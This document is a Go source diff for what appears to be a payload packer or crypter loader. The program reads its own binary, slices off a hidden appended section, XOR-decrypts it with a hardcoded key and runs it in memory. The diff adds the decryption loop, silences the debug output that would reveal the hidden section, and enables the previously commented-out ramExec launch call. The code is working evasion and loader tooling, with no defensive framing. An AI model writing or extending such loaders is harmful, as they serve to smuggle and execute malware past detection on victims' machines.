@@ -15,27 +15,43 @@ import (
 )
 
 const KEY string = "changethiskey"
-const SIZE int = 1946124
+const SIZE int = 2006905
+
+func end(msg string) {
+	fmt.Println(msg)
+	os.Exit(1)
+}
 
 func check(err error, msg string) {
 	if err != nil {
-		fmt.Println(msg)
-		panic(err)
+		end(msg)
 	}
 }
 
 func unpack(filename string) []byte {
-	fmt.Printf("Unpacking %s ...\n", filename)
+	//fmt.Printf("Unpacking %s ...\n", filename)
 	bin, err := ioutil.ReadFile(filename)
 	check(err, "error reading file")
-	fmt.Printf("unpacked %d bytes\n", len(bin))
+	//fmt.Printf("unpacked %d bytes\n", len(bin))
 	stage2 := bin[SIZE:]
-	fmt.Printf("hidden section size: %d == %d\n", len(bin)-SIZE, len(stage2))
+	//fmt.Printf("hidden section size: %d == %d\n", len(bin)-SIZE, len(stage2))
+	if len(bin)-SIZE != len(stage2) {
+		end("error unpacking failed")
+	}
+
+	fmt.Println("Unpacked.")
 	return stage2
 }
 
 func decrypt(stage2 []byte) []byte {
+	key := []byte(KEY)
+	kl := len(key)
 
+	for i := 0; i < len(stage2); i++ {
+		stage2[i] = stage2[i] ^ key[i%kl]
+	}
+
+	fmt.Println("Decrypted.")
 	return stage2
 }
 
@@ -68,5 +84,6 @@ func ramExec(stage2 []byte) {
 func main() {
 	myself := os.Args[0]
 	stage2 := decrypt(unpack(myself))
-	//ramExec(stage2)
+	fmt.Println("Launching ...")
+	ramExec(stage2)
 }
